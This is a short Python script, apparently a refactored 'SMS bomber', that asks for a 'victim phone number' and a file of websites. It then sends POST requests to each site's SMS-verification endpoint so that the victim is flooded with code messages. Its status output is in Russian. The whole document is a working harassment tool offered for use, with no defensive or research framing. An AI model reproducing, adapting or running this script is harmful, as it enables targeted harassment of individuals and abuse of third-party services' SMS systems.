#!/usr/bin/python3
# refactored boolshit
# author of refactoring: @r0tt3n-m3m0ry
# original spamer: https://github.com/FSystem88/spymer

try:
    import requests
except:
    print('You have to install missed modules via \'$ pip3 install -r requirements.txt\' before run this script.'); exit()

import ast
import os

def clear_screen():
    os.system('cls') if os.name == 'nt' else os.system('clear')

clear_screen()

phone = input('Enter victim phone number (in an international format): ')

with open(input('Enter name of file with sms senders data: ')) as datafile:
    for data_string in datafile:
        if data_string[0] == '#' or data_string == '\n':
            pass
        else:
            site_title = data_string.split(' <> ')[0]
            site_link = data_string.split(' <> ')[1]
            json_for_post = data_string.split(' <> ')[-2]
            phone_type = data_string.split(' <> ')[-1].strip()

            if phone_type == '1':
                json_for_post = json_for_post.replace('>>SMS<<', phone)
            elif phone_type == '2':
                json_for_post = json_for_post.replace('>>SMS<<', phone.replace('+7', '8'))
            elif phone_type == '3':
                json_for_post = json_for_post.replace('>>SMS<<', phone.replace('+7', '7'))
            elif phone_type == '4':
                json_for_post = json_for_post.replace('>>SMS<<', phone[2:])
            else:
                print(f'Ошибка в строке сайта \'{site_title}\': неверный тип формата номера. Пропускаю.')
                continue
            
            try:
                requests.post(site_link, data=ast.literal_eval(json_for_post))
                print(f'На сайт \'{site_title}\' отправлен запрос SMS кода, передан номер телефона {phone}')
            except:
                print(f'Не удалось отправить запрос SMS кода на сайт \'{site_title}\', передан номер телефона {phone}')
